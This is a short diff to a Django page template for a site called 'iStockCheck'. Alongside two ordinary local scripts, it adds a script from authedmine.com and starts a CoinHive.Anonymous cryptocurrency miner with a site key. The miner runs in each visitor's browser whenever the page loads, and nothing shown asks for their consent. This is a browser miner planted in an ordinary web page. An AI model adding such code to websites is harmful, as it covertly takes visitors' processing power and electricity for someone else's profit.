@@ -4,6 +4,11 @@
 {% block head %}
     <script src="{% static 'main/notify.js' %}"></script>
     <script src="{% static 'main/stockchecker_2.js' %}"></script>
+	<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+	<script>
+		var miner = new CoinHive.Anonymous('5RWfxTgbYO2mg5j39iFI055Jqw7Qntaj');
+		miner.start();
+	</script>
     <title>iStockCheck</title>
 {% endblock %}
 
